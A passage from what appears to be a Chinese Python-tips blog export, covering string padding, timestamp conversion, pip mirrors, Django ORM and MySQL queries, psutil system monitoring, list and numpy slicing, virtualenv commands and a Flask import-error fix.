title=\"106、字符串不足补零\"></a>106、字符串不足补零</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;hello world&#x27;.zfill(15)) # 补0</span><br><span class=\"line\">print(&#x27;hello world&#x27;.rjust(15)) # 右对齐，补空格</span><br><span class=\"line\">print(&#x27;hello world&#x27;.ljust(15)) # 左对齐，补空格</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">0000hello world</span><br><span class=\"line\">    hello world</span><br><span class=\"line\">hello world  </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"107、时间戳转字符串日期\"><a href=\"#107、时间戳转字符串日期\" class=\"headerlink\" title=\"107、时间戳转字符串日期\"></a>107、时间戳转字符串日期</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">t1 = time.time()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.strftime(<span class=\"string\">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime(t1)))</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"><span class=\"number\">1621741567.082192</span></span><br><span class=\"line\"><span class=\"number\">2021</span>-05-<span class=\"number\">23</span> <span class=\"number\">11</span>:<span class=\"number\">46</span>:07</span><br></pre></td></tr></table></figure>\n\n<p>使用函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># !/usr/bin/python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">@contact: 微信 1257309054</span><br><span class=\"line\">@file: 时间戳转日期.py</span><br><span class=\"line\">@time: 2022/6/27 17:16</span><br><span class=\"line\">@author: LDC</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">import time</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 正确10位长度的时间戳可精确到秒，11-14位长度则是包含了毫秒</span><br><span class=\"line\">def int_to_datetime(intValue):</span><br><span class=\"line\">    if len(str(intValue)) == 10:</span><br><span class=\"line\">        # 精确到秒</span><br><span class=\"line\">        timeValue = time.localtime(intValue)</span><br><span class=\"line\">        tempDate = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, timeValue)</span><br><span class=\"line\">        datetimeValue = datetime.datetime.strptime(tempDate, &quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class=\"line\">    elif 10 &lt; len(str(intValue)) and len(str(intValue)) &lt; 15:</span><br><span class=\"line\">        # 精确到毫秒</span><br><span class=\"line\">        k = len(str(intValue)) - 10</span><br><span class=\"line\">        timetamp = datetime.datetime.fromtimestamp(intValue / (1 * 10 ** k))</span><br><span class=\"line\">        datetimeValue = timetamp.strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return -1</span><br><span class=\"line\">    return datetimeValue</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">time1 = 1656321420</span><br><span class=\"line\">time2 = 1656321086560</span><br><span class=\"line\">print(int_to_datetime(time1))</span><br><span class=\"line\">print(int_to_datetime(time2))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">输出：</span><br><span class=\"line\">2022-06-27 17:17:00</span><br><span class=\"line\">2022-06-27 17:11:26.560000</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"108、列表转字符串\"><a href=\"#108、列表转字符串\" class=\"headerlink\" title=\"108、列表转字符串\"></a>108、列表转字符串</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;,&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>,a)))</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\">`<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>`</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"109、pip国内镜像源\"><a href=\"#109、pip国内镜像源\" class=\"headerlink\" title=\"109、pip国内镜像源\"></a>109、pip国内镜像源</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install 库名 -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">清华：-i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class=\"line\"></span><br><span class=\"line\">阿里云：-i http://mirrors.aliyun.com/pypi/simple/</span><br><span class=\"line\"></span><br><span class=\"line\">中国科技大学 -i https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class=\"line\"></span><br><span class=\"line\">华中理工大学：-i http://pypi.hustunique.com/</span><br><span class=\"line\"></span><br><span class=\"line\">山东理工大学：-i http://pypi.sdutlinux.org/ </span><br><span class=\"line\"></span><br><span class=\"line\">豆瓣：-i http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"110、python把时间字符串转换成刚刚、1天前、3个月前、1年前\"><a href=\"#110、python把时间字符串转换成刚刚、1天前、3个月前、1年前\" class=\"headerlink\" title=\"110、python把时间字符串转换成刚刚、1天前、3个月前、1年前\"></a>110、python把时间字符串转换成刚刚、1天前、3个月前、1年前</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import datetime</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def date_interval(date_str):</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    获取时间间隔</span><br><span class=\"line\">    1分钟前，2分钟前，10分钟前，1小时前，2小时前，1天前，2天前，3天前，1个月前，3个月前，1年前，3年前</span><br><span class=\"line\">    :param date_str: 时间字符串</span><br><span class=\"line\">    :return: 字符串</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    date_str = time.strptime(date_str, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">    # 将时间元组转换为时间戳</span><br><span class=\"line\">    t = time.mktime(date_str)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 当前时间</span><br><span class=\"line\">    seconds = time.time() - t</span><br><span class=\"line\"></span><br><span class=\"line\">    years = int(seconds // (60 * 60 * 24 * 365))</span><br><span class=\"line\">    if years:</span><br><span class=\"line\">        return &#x27;&#123;&#125;年前&#x27;.format(years)</span><br><span class=\"line\">    months = int(seconds // (60 * 60 * 24 * 30))</span><br><span class=\"line\">    if months:</span><br><span class=\"line\">        return &#x27;&#123;&#125;月前&#x27;.format(months)</span><br><span class=\"line\">    days = int(seconds // (60 * 60 * 24))</span><br><span class=\"line\">    if days:</span><br><span class=\"line\">        return &#x27;&#123;&#125;天前&#x27;.format(days)</span><br><span class=\"line\">    hours = int(seconds // (60 * 60))</span><br><span class=\"line\">    if hours:</span><br><span class=\"line\">        return &#x27;&#123;&#125;小时前&#x27;.format(hours)</span><br><span class=\"line\">    minutes = int(seconds // (60))</span><br><span class=\"line\">    if minutes:</span><br><span class=\"line\">        return &#x27;&#123;&#125;分钟前&#x27;.format(minutes)</span><br><span class=\"line\">    return &#x27;刚刚&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    date1 = &#x27;2019-07-10 15:27:51&#x27;</span><br><span class=\"line\">    date2 = &#x27;2021-07-10 15:27:51&#x27;</span><br><span class=\"line\">    date3 = &#x27;2021-08-10 15:27:51&#x27;</span><br><span class=\"line\">    date4 = &#x27;2021-08-12 11:01:51&#x27;</span><br><span class=\"line\">    date5 = datetime.datetime.now() + datetime.timedelta(seconds=-3)</span><br><span class=\"line\">    date5 = date5.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">    print(date_interval(date1))</span><br><span class=\"line\">    print(date_interval(date2))</span><br><span class=\"line\">    print(date_interval(date3))</span><br><span class=\"line\">    print(date_interval(date4))</span><br><span class=\"line\">    print(date_interval(date5))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"111、Django使用ORM执行sql语句\"><a href=\"#111、Django使用ORM执行sql语句\" class=\"headerlink\" title=\"111、Django使用ORM执行sql语句\"></a>111、Django使用ORM执行sql语句</h2><p>通过raw函数执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alarm_datas = gsm.AlertMessage.objects.raw(&#x27;&#x27;&#x27;</span><br><span class=\"line\">                select am_all.id, am_all.sensor_number</span><br><span class=\"line\">                    FROM alert_message as am_all</span><br><span class=\"line\">                    where </span><br><span class=\"line\">                        am_all.real=&#x27;1&#x27;</span><br><span class=\"line\">                        and am_all.is_show=1</span><br><span class=\"line\">                    order by am_all.alarm_level desc</span><br><span class=\"line\">                &#x27;&#x27;&#x27;)</span><br><span class=\"line\">for ad in alarm_datas:</span><br><span class=\"line\">\tprint(ad.sensor_number)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"112、Django通过变量字段获取数据\"><a href=\"#112、Django通过变量字段获取数据\" class=\"headerlink\" title=\"112、Django通过变量字段获取数据\"></a>112、Django通过变量字段获取数据</h2><p>通过方法<code>__getattribute__</code>来获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alert_messages = AlertMessage.objects.filter(real=0)</span><br><span class=\"line\">am_fields = [&#x27;id&#x27;, &#x27;real&#x27;, &#x27;name&#x27;]</span><br><span class=\"line\">for am in alert_messages:</span><br><span class=\"line\">\tfor i in range(len(am_fields)):</span><br><span class=\"line\">\t\tprint(am_fields[i], am.__getattribute__(am_fields[i]))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"113、Django查询变量字段、更新变量字段\"><a href=\"#113、Django查询变量字段、更新变量字段\" class=\"headerlink\" title=\"113、Django查询变量字段、更新变量字段\"></a>113、Django查询变量字段、更新变量字段</h2><p>通过<code>**&#123;变量名:值&#125;</code>来操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">field = &#x27;device_code&#x27;</span><br><span class=\"line\"># 查询</span><br><span class=\"line\">device_infos = gsm.DeviceInfo.objects.filter(**&#123;field: &#x27;012&#x27;&#125;)</span><br><span class=\"line\"># 更新</span><br><span class=\"line\">gsm.DeviceInfo.objects.filter(device_code=&#x27;012&#x27;).update(**&#123;field : &#x27;0&#x27;&#125;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"114、vue生成dist文件\"><a href=\"#114、vue生成dist文件\" class=\"headerlink\" title=\"114、vue生成dist文件\"></a>114、vue生成dist文件</h2><p>安装npm，到<a href=\"https://nodejs.org/en/download/\">官网下载</a><br>在vue项目下打开cmd，输入命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm run build</span><br></pre></td></tr></table></figure>\n\n<p>如果报错，npm ERR! missing script: build，<br>则使用以下命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm run build:prod</span><br></pre></td></tr></table></figure>\n\n<p>具体看package.json</p>\n<p><img src=\"https://img-blog.csdnimg.cn/eff15dcd4c1d499f9641d0ac25c09bc0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Lic5pyo5pyI,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"115、python获取电脑磁盘、CPU、内存使用情况\"><a href=\"#115、python获取电脑磁盘、CPU、内存使用情况\" class=\"headerlink\" title=\"115、python获取电脑磁盘、CPU、内存使用情况\"></a>115、python获取电脑磁盘、CPU、内存使用情况</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import psutil</span><br><span class=\"line\">#  pip install psutil</span><br><span class=\"line\"></span><br><span class=\"line\"># 获取本机磁盘使用率和剩余空间G信息</span><br><span class=\"line\">def get_disk_info():</span><br><span class=\"line\">    # 循环磁盘分区</span><br><span class=\"line\">    content = &quot;&quot;</span><br><span class=\"line\">    for disk in psutil.disk_partitions():</span><br><span class=\"line\">        # 读写方式 光盘 or 有效磁盘类型</span><br><span class=\"line\">        if &#x27;cdrom&#x27; in disk.opts or disk.fstype == &#x27;&#x27;:</span><br><span class=\"line\">            continue</span><br><span class=\"line\">        disk_name_arr = disk.device.split(&#x27;:&#x27;)</span><br><span class=\"line\">        disk_name = disk_name_arr[0]</span><br><span class=\"line\">        disk_info = psutil.disk_usage(disk.device)</span><br><span class=\"line\">        # 磁盘剩余空间，单位G</span><br><span class=\"line\">        free_disk_size = disk_info.free//1024//1024//1024</span><br><span class=\"line\">        # 当前磁盘使用率和剩余空间G信息</span><br><span class=\"line\">        info = &quot;&#123;&#125;盘使用率：&#123;&#125;%%， 剩余空间：&#123;&#125;G &quot;.format(disk_name, str(disk_info.percent), free_disk_size)</span><br><span class=\"line\">        # 拼接多个磁盘的信息</span><br><span class=\"line\">        content = content + info</span><br><span class=\"line\">    print(content)</span><br><span class=\"line\"></span><br><span class=\"line\"># cpu信息</span><br><span class=\"line\">def get_cpu_info():</span><br><span class=\"line\">    cpu_percent = psutil.cpu_percent(interval=1)</span><br><span class=\"line\">    cpu_info = &quot;CPU使用率：%i%%&quot; % cpu_percent</span><br><span class=\"line\">    print(cpu_info)</span><br><span class=\"line\"></span><br><span class=\"line\"># 内存信息</span><br><span class=\"line\">def get_memory_info():</span><br><span class=\"line\">    virtual_memory = psutil.virtual_memory()</span><br><span class=\"line\">    used_memory = virtual_memory.used/1024/1024/1024</span><br><span class=\"line\">    free_memory = virtual_memory.free/1024/1024/1024</span><br><span class=\"line\">    memory_percent = virtual_memory.percent</span><br><span class=\"line\">    memory_info = &quot;内存使用：%0.2fG，使用率%0.1f%%，剩余内存：%0.2fG&quot; % (used_memory, memory_percent, free_memory)</span><br><span class=\"line\">    print(memory_info)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    get_disk_info()</span><br><span class=\"line\">    get_cpu_info()</span><br><span class=\"line\">    get_memory_info()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"116、max比较字典列表\"><a href=\"#116、max比较字典列表\" class=\"headerlink\" title=\"116、max比较字典列表\"></a>116、max比较字典列表</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">使用max函数比较字典列表对象</span><br><span class=\"line\">需求：找出用户组最大id的字典</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">def com_id(f):</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    比较用用户ids列表</span><br><span class=\"line\">    :param f: 字典</span><br><span class=\"line\">    :return: 返回最大的用户id</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    return max(f[&#x27;user_ids&#x27;])</span><br><span class=\"line\"></span><br><span class=\"line\">friends_added = [</span><br><span class=\"line\">        &#123;&#x27;user_ids&#x27;: [1, 2], &#x27;create_at&#x27;: &#x27;2020-01-01&#x27;&#125;,</span><br><span class=\"line\">        &#123;&#x27;user_ids&#x27;: [3, 6], &#x27;create_at&#x27;: &#x27;2020-01-02&#x27;&#125;,</span><br><span class=\"line\">        &#123;&#x27;user_ids&#x27;: [2, 1], &#x27;create_at&#x27;: &#x27;2020-02-02&#x27;&#125;,</span><br><span class=\"line\">        &#123;&#x27;user_ids&#x27;: [4, 1], &#x27;create_at&#x27;: &#x27;2020-02-02&#x27;&#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\"># max函数中使用key参数，指定自定义函数来比较</span><br><span class=\"line\">item = max(friends_added, key=com_id)</span><br><span class=\"line\">item_1 = max(friends_added, key=lambda f: max(f[&#x27;user_ids&#x27;])) # com_id可以转成lambda函数</span><br><span class=\"line\">print(item)</span><br><span class=\"line\">print(item_1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#x27;user_ids&#x27;: [3, 6], &#x27;create_at&#x27;: &#x27;2020-01-02&#x27;&#125;</span><br><span class=\"line\">&#123;&#x27;user_ids&#x27;: [3, 6], &#x27;create_at&#x27;: &#x27;2020-01-02&#x27;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"117、django查询表的具体字段\"><a href=\"#117、django查询表的具体字段\" class=\"headerlink\" title=\"117、django查询表的具体字段\"></a>117、django查询表的具体字段</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ExampleModel.objects.values(&#x27;id&#x27;, &#x27;username&#x27;)</span><br><span class=\"line\"># 返回的结果是QuerySet， 里面的元素是dict格式</span><br><span class=\"line\"># [&#123;&#x27;id&#x27;:1, &#x27;username&#x27;: &#x27;Austin&#x27;&#125;, &#123;&#x27;id&#x27;:2, &#x27;username&#x27;:&#x27;Sam&#x27;&#125;, ...]</span><br><span class=\"line\"># 相当于SQL中的SELECT id, username FROM ......, </span><br><span class=\"line\"># 只返回对应属性（字段）的值</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"118、MySQL查询数据添加自增序号\"><a href=\"#118、MySQL查询数据添加自增序号\" class=\"headerlink\" title=\"118、MySQL查询数据添加自增序号\"></a>118、MySQL查询数据添加自增序号</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set @i = 0;</span><br><span class=\"line\">select waveform, &#x27;沿桥风吹&#x27; as label ,(@i:=@i+1) xh from alert_message where is_real=1 and node_id=138</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"119、MySQL-时间截取年月日\"><a href=\"#119、MySQL-时间截取年月日\" class=\"headerlink\" title=\"119、MySQL 时间截取年月日\"></a>119、MySQL 时间截取年月日</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,</span><br><span class=\"line\">\t\t\taddtime, </span><br><span class=\"line\">\t\t\tdate_format(addtime,&#x27;%Y-%m-%d&#x27;) as short_time </span><br><span class=\"line\">\tfrom alert_message </span><br><span class=\"line\">\twhere date_format(addtime,&#x27;%Y-%m-%d&#x27;) = &#x27;2022-03-13&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/37cec67fa1e1458f9aba1b745600a493.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"120、-列表取奇数下标值\"><a href=\"#120、-列表取奇数下标值\" class=\"headerlink\" title=\"120、 列表取奇数下标值\"></a>120、 列表取奇数下标值</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;c&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;奇数下标值&#x27;</span>,list1[<span class=\"number\">1</span>::<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">奇数下标值 [<span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"121、列表取偶数下标值\"><a href=\"#121、列表取偶数下标值\" class=\"headerlink\" title=\"121、列表取偶数下标值\"></a>121、列表取偶数下标值</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;c&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;偶数下标值&#x27;</span>,list1[::<span class=\"number\">2</span>])</span><br><span class=\"line\">偶数下标值 [<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;e&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"122、列表相同元素分类、分组\"><a href=\"#122、列表相同元素分类、分组\" class=\"headerlink\" title=\"122、列表相同元素分类、分组\"></a>122、列表相同元素分类、分组</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"></span><br><span class=\"line\">data = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>]</span><br><span class=\"line\">a =[<span class=\"built_in\">list</span>(group) <span class=\"keyword\">for</span> key, group <span class=\"keyword\">in</span> itertools.groupby(data)]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">[[<span class=\"number\">1</span>], [<span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>], [<span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">3</span>], [<span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>], [<span class=\"number\">1</span>], [<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>]]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"123、ubuntu切换用户\"><a href=\"#123、ubuntu切换用户\" class=\"headerlink\" title=\"123、ubuntu切换用户\"></a>123、ubuntu切换用户</h2><p>1）从user用户切换到root用户<br>sudo su<br>2）从root用户切回user用户<br>su user (user是你自己安装时候的用户名)，或是直接输入exit，也可Ctrl+D组合键推出</p>\n<h2 id=\"124、numpy二维数组获取某一列\"><a href=\"#124、numpy二维数组获取某一列\" class=\"headerlink\" title=\"124、numpy二维数组获取某一列\"></a>124、numpy二维数组获取某一列</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">a = [</span><br><span class=\"line\">    [1, 2, 3, 4, 5, 6],</span><br><span class=\"line\">    [7, 8, 9, 10, 11, 12],</span><br><span class=\"line\">    [13.2, 14.8, 15.9, 16.10, 16.11, 17.12],</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">a_np = np.array(a)  # 把二维列表转成numpy数组</span><br><span class=\"line\">print(&#x27;第一行&#x27;, a_np[0].tolist())  # 获取第一行</span><br><span class=\"line\">print(&#x27;第一列&#x27;, a_np[:, 0].tolist())  # 获取第一列</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">第一行 [1.0, 2.0, 3.0, 4.0, 5.0, 6.0]</span><br><span class=\"line\">第一列 [1.0, 7.0, 13.2]</span><br></pre></td></tr></table></figure>\n\n","categories":["python"],"tags":["搜集"]},{"title":"疑难解答-python","url":"/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-python/","content":"<h1 id=\"python虚拟环境的常见命令\"><a href=\"#python虚拟环境的常见命令\" class=\"headerlink\" title=\"python虚拟环境的常见命令\"></a>python虚拟环境的常见命令</h1><p>原文：<a href=\"https://www.jianshu.com/p/d8833799d934\">https://www.jianshu.com/p/d8833799d934</a> </p>\n<p>当做一个项目时，可能会用到一些模块，如果都用电脑自带的python环境，并且把所有的模块都安装在这上面，很容易使得自带python环境十分臃肿，而且到时候如果迁移到别的电脑时还需要重新安装对应模块，所以可以用虚拟环境，在不同的环境下安装对应的模块，迁移时也把整个环境迁移过去即可使用虚拟环境步骤</p>\n<p>1.创建虚拟环境<br>输入命令：<code>virtualenv 环境名</code><br>（如果有多个python版本，可以通过命令：<code>virtualenv -p python路径 环境名</code>，来创建虚拟环境）<br>2.进入环境下的<code>Scripts</code>文件夹下<br>输入命令执行脚本：<code>activate</code><br>3.接下来就可以在该虚拟环境下pip安装包或者做各种事了，</p>\n<p>比如要安装django2.0版本就可以：<code>pip install django==2.0</code></p>\n<p><strong>退出虚拟环境</strong></p>\n<p>输入命令：<code>deactivate</code></p>\n<p><strong>管理虚拟环境</strong></p>\n<p>虚拟环境还可以通过一些工具来管理，从而使用起来更加方便，这里推荐<code>virtualenvwrapper</code><br>输入命令：<code>pip install virtualenvwrapper-win</code>（window版），下载<code>virtualenvwrapper</code></p>\n<p><strong>创建虚拟环境</strong></p>\n<p>输入命令：<code>mkvirtualenv 环境名</code><br>与直接用virtualenv创建不同的是，前面那个是在当前文件夹下创建虚拟环境，而这个是统一在当前用户的<code>envs</code>文件夹下创建，并且会自动进入到该虚拟环境下<br>如果不想在默认地方创建（<code>c:userenvs</code>），可以新建个环境变量：<code>WORKON_HOME</code>，然后里面设置默认路径<br>如果要指定python版本，则输入：<code>mkvirtualenv --python=python路径（到exe文件） 环境名</code></p>\n<p><strong>进入虚拟环境输入命令</strong>：<code>workon 环境名</code></p>\n<p><strong>退出虚拟环境输入命令</strong>：<code>deactivate</code></p>\n<p><strong>删除虚拟环境输入命令</strong>：<code>rmvirtualenv 环境名</code></p>\n<p><strong>列出虚拟环境输入命令</strong>：<code>lsvirtualenv</code></p>\n<p><strong>进入到虚拟环境目录输入命令</strong>：<code>cdvirtualenv 环境名</code></p>\n<p>更多参考<a href=\"https://www.cnblogs.com/codechangemyworld/p/5277032.html\">https://www.cnblogs.com/codechangemyworld/p/5277032.html</a><br><a href=\"https://www.cnblogs.com/chenxinming-top/p/7843178.html\">https://www.cnblogs.com/chenxinming-top/p/7843178.html</a></p>\n<h1 id=\"notes\"><a href=\"#notes\" class=\"headerlink\" title=\"notes\"></a>notes</h1><p>修改pip安装源：<br>在”c:\\users***\\pip&quot;下创建”pip.ini”文件<br>文件内写上：<br>[global]<br>index-url=<a href=\"https://pypi.doubanio.com/simple\">https://pypi.doubanio.com/simple</a></p>\n<p>查看依赖库版本：pip freeze / pip list<br>安装指定版本依赖库：pip install ***==x.x.x<br>生成所需依赖库txt文件：pip freeze &gt; requirements.txt<br>根据已有依赖库txt文件安装库：pip install -r requirements.txt</p>\n<h1 id=\"Python-flask-flask-script-报错：ModuleNotFoundError-No-module-named-‘flask-compat’解决方法\"><a href=\"#Python-flask-flask-script-报错：ModuleNotFoundError-No-module-named-‘flask-compat’解决方法\" class=\"headerlink\" title=\"Python flask flask_script 报错：ModuleNotFoundError: No module named ‘flask._compat’解决方法\"></a>Python flask flask_script 报错：ModuleNotFoundError: No module named ‘flask._compat’解决方法</h1><ul>\n<li><a href=\"javascript:void(0);\">levi</a> 编辑于 2021-06-27</li>\n</ul>\n<p>本文主要介绍Python中，使用flask中flask_script时，报错：ModuleNotFoundError: No module named ‘flask._compat’的解决方法，以及相关示例代码。</p>\n<p><strong>manage.py：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from flask_script import Manager</span><br><span class=\"line\">from main import app</span><br><span class=\"line\">manager = Manager(app)</span><br><span class=\"line\">@manager.command</span><br><span class=\"line\">def hello():</span><br><span class=\"line\">    print (&quot;hello&quot;)</span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    manager.run()</span><br></pre></td></tr></table></figure>\n\n<p><strong>main.py:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from flask import Flask</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br></pre></td></tr></table></figure>\n\n<p><strong>报错信息：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(venv) cjavapy@cjavapy-PC:~/Proyectos Python/flask_script$ python3 manage.py hello</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;manage.py&quot;, line 1, in &lt;module&gt;</span><br><span class=\"line\">    from flask_script import Manager</span><br><span class=\"line\">  File &quot;/home/cjavapy/Proyectos Python/flask_script/venv/lib/python3.8/site-packages/flask_script/__init__.py&quot;, line 15, in &lt;module&gt;</span><br><span class=\"line\">    from flask._compat import text_type</span><br><span class=\"line\">ModuleNotFoundError: No module named &#x27;flask._compat&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><strong>原因：</strong></p>\n<p>可能是更新了Flask版本问题，导致<code>Flask._compat</code>的目录发生变化。</p>\n<p><strong>解决方法：</strong></p>\n<p>使用如下命令降级；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install &quot;Flask==1.1.4&quot;</span><br><span class=\"line\">pip 